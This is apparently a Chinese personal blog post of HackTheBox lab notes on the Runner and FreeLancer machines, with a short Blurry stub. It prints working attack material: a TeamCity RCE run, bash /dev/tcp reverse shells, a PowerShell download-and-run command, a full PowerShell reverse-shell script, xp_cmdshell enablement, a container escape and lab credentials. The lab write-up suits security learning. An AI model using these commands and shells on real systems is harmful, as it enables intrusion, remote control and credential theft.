---
title: HackTheBox 笔记 - 2
date: 2024-06-04 13:52:00
tags: [Web, 渗透]
categories: 渗透
---

Runner / FreeLancer / Blurry

<!--more-->

## Runner

扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 `/health` 和 `/version` 路由，也没什么用。
再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕

```bash
wfuzwfuzz -c -w  /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u "http://runner.htb" -H "Host:FUZZ.runner.htb" --hw 10
```

于是就扫出来 `teamcity.runner.htb`，访问，是个 TeamCity。搜一下 CVE：

```bash
$ searchsploit teamcity
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                              | java/remote/47891.txt
JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                       | java/remote/51884.py
TeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                  | multiple/remote/46514.js
TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                          | multiple/remote/45917.rb
TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                              | php/webapps/48201.py
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

网页写着 `Version 2023.05.3 (build 129390)`，这不正好是 CVE-2023-42793，直接 `searchsploit -p java/remote/51884.py` 找到 PoC 的位置，然后复制过来跑

```bash
$ python 51884.py -u http://teamcity.runner.htb

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkw
Successfully exploited!
URL: http://teamcity.runner.htb
Username: city_adminOpx8
Password: Main_password!!**
```

把 Token 存到文件 `token`，然后执行这个 [PoC](https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py)

```bash
python rce.py -u http://teamcity.runner.htb -t token -c '"/bin/bash"&params="-c"&params="sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261"'
```

然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 换个 shell（不知道和直接 `bash` 有啥区别），传 `linpeas.sh` 执行没找到啥，但是能搜到一个 `id_rsa`。

```bash
find / -name id_rsa 2> /dev/null
```

这里 `2> /dev/null` 是把 stderr 重定向到 `/dev/null`，不然会有很多权限不足的提示。
在网站中的 User 里有个 john，然后就可以用这个 `id_rsa` 登录 john 了。

```bash
chmod 600 id_rsa
ssh john@runner.htb -i id_rsa
```

一开始报 `Load key "id_rsa": error in libcrypto`，原来是末尾少打一个换行。
再传 `linpeas.sh` 扫一轮，发现 `/etc/hosts` 里还有个域名叫 `portainer-administration.runner.htb`，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。

之前的网站是有个备份的，下载下来能找到 `users`，内容如下：

```csv
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT
```

用 john 把 matthew 的密码爆出来，为 `piper123`，注意 john 会把结果存在 `~/.john/john.pot` 里，再跑的话要 `john --show hash.txt` 才能显示。

用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 `/proc/self/fd/8`，网页 shell 不好使，用 bash 弹个 shell 回来：

```bash
bash -i >& /dev/tcp/10.10.16.18/55555 0>&1
```

然后 `cat ../../../root/root.txt` 就拿到第二个 flag 了。
无聊的时候想用 john 爆 `/etc/shadow` 里 root 的密码，发现还得加 `--format=crypt`。

### 后继小研究

发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令：

```bash
sed -i 's/root:x:/root::/' ../../../etc/passwd
```

然后就可以 `su root` 了，执行 `crontab -e`，发现有个定时任务。

```bash
@reboot docker start kind_leavitt
@reboot /root/monitor.sh
*/5 * * * * /root/monitor.sh
*/2 * * * * /root/docker_clean.sh
```

### 浅谈 Docker 涉及的一些概念

**cgroup**（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。
**runC** 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。
**containerd** 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。
**CRI-O** 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。
> 总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。

## FreeLancer

fscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。

```bash
$ fscan -h 10.10.11.5 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
10.10.11.5:88 open
10.10.11.5:139 open
10.10.11.5:135 open
10.10.11.5:53 open
10.10.11.5:593 open
10.10.11.5:80 open
10.10.11.5:464 open
10.10.11.5:389 open
10.10.11.5:445 open
10.10.11.5:636 open
10.10.11.5:3269 open
10.10.11.5:3268 open
10.10.11.5:5985 open
10.10.11.5:9389 open
10.10.11.5:47001 open
10.10.11.5:49667 open
10.10.11.5:49669 open
10.10.11.5:49665 open
10.10.11.5:49671 open
10.10.11.5:49670 open
10.10.11.5:49664 open
10.10.11.5:49675 open
10.10.11.5:49672 open
10.10.11.5:49666 open
10.10.11.5:49815 open
10.10.11.5:55297 open
[*] alive ports len is: 26
start vulscan
[*] WebTitle http://10.10.11.5         code:302 len:0      title:None 跳转url: http://freelancer.htb/
[*] NetInfo
[*]10.10.11.5
   [->]DC
   [->]10.10.11.5
[*] WebTitle http://10.10.11.5:5985    code:404 len:315    title:Not Found
[*] WebTitle http://10.10.11.5:47001   code:404 len:315    title:Not Found
[*] WebTitle http://freelancer.htb/    code:200 len:57293  title:Freelancer - Job Board & Hiring platform
已完成 26/26
[*] 扫描结束,耗时: 1m15.097074037s
```

老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 `/admin` 路由的。
注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。
有个二维码登录的功能，说用手机扫就能直接登录，随便找个[在线识别网站](https://zxing.org/w/decode.jspx)识别出 `http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/`

`MTAwMTA=` base64 解出是 `10010`，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 `http://freelancer.htb/accounts/profile/visit/10010/` ，那么就八九不离十了，从 1 开始试，发现 `http://freelancer.htb/accounts/profile/visit/2/` 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 `Mg==`，拼接链接 `http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/` 成功登录 admin。

登上之后页面和之前差不多，直接进 `/admin` 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限

执行如下命令：

```sql
SELECT name AS DatabaseName, suser_sname(owner_sid) AS Owner
FROM sys.databases;
```

可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell：

```sql
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

再

```sql
EXEC xp_cmdshell 'dir'
```

发现命令执行成功。
想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows

```sql
EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)'
```

发现弹了一下就断了，应该是被杀软掐了。
试了很多个都不行，没办法了，用大哥找到的：

```shell
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.18',55555)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()
```

看到用户文件夹下的 `Download` 有个 `SQLEXPR-2019_x64_ENU` 目录，进去发现 `sql-Configuration.INI`，内容如下：

```ini
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

用这两个密码和 Users 文件夹下的用户开爆

```bash
$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txt
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE

SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
```

爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 [RunasCs](https://github.com/antonioCoco/RunasCs) 横向移动，执行

```shell
./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556
```

把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。
这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。

system flag 涉及域渗透，一点不会。
桌面还有个 `mail.txt`，内容如下：

```plain
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```

翻译一下就是

```plain
你好，米卡萨，

我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。

我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。

然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。

此致

最佳问候
```

意思就是他把内存 dump 下来了，看样子应该就是 `Desktop` 下的 `MEMORY.7z`，如何把这个文件传出来费了很大劲。

## Blurry

fscan 开扫

```bash
start infoscan
10.10.11.19:80 open
10.10.11.19:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://10.10.11.19        code:301 len:169    title:301 Moved Permanently 跳转url: http://app.blurry.htb/
```

## 参考

Runner
<https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632>
<https://blog.csdn.net/m0_52742680/article/details/138076335>
<https://nitroc.org/posts/cve-2024-21626-illustrated/>

FreeLancer
<https://blog.csdn.net/m0_52742680/article/details/139441094>
